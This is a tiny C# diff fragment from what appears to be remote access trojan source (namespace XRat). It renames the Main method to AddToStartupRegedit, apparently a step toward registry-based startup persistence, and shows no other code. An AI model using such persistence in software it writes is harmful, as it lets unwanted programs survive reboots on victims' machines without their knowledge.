@@ -188,7 +188,7 @@ namespace XRat
             }
         }
 
-        static void Main(string[] args)
+        static void AddToStartupRegedit(string[] args)
         {
             Settings.filename = Settings.filename + ".exe";
 
